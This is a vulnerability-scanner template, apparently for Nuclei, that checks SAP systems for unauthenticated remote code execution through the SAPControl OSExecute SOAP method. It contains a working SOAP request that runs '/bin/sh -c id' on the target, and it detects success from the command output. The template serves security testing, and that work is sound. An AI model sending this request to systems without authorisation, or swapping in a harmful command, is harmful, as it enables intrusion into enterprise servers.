id: sap-osexecute-rce

info:
  name: SAPControl OSExecute 远程代码执行
  author: LRVT,l4rm4nd
  severity: critical
  description: |
    该模板用于核查 SAPControl OSExecute 远程代码执行。该类问题通常源于 SAP NetWeaver、SAPControl 或 ICM 管理接口暴露，导致未授权用户可读取系统信息、日志、配置或执行管理操作。模板会向目标发送探测请求，并依据匹配 `OSExecuteResponse`、匹配 `<output>`、匹配 `uid=[0-9]+\(`等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可获取 SAP 版本、实例属性、配置文件、日志内容和系统路径等敏感信息。
    - 若管理方法可被调用，可能进一步导致命令执行、系统操作或业务中断。
  remediation: |
    - 限制 SAPControl、ICM Admin 和相关 SOAP/Web 管理接口的来源地址。
    - 启用强认证、最小权限和访问审计，关闭不需要公开的管理方法。
    - 检查 SAP 日志和实例配置，确认是否存在未授权访问或敏感信息泄露。
  reference:
    - https://sapdotbasis.wordpress.com/2019/08/08/sapcontrol-command/
    - https://itsiti.com/csmon/
    - https://help.sap.com/docs/SUPPORT_CONTENT/si/3362959700.html
    - https://docs.avantra.com/api/latest/js/sap-control.html
    - https://www.slideshare.net/slideshow/sap-insecurity-scrubbing-sap-clean-with-soap/9951290
  metadata:
    max-request: 1
  tags: misconfig,sap,sapcontrol,soap,rce,osexecute

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=UTF-8
        SOAPAction: '""'

        <?xml version="1.0" encoding="utf-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
          <SOAP-ENV:Header>
            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
              <enableSession>true</enableSession>
            </sapsess:Session>
          </SOAP-ENV:Header>
          <SOAP-ENV:Body>
            <ns1:OSExecute xmlns:ns1="urn:SAPControl">
              <command>/bin/sh -c id</command>
              <async>0</async>
            </ns1:OSExecute>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "OSExecuteResponse"
          - "<output>"
        condition: and

      - type: regex
        part: body
        regex:
          - "uid=[0-9]+\\("

      - type: status
        status:
          - 200
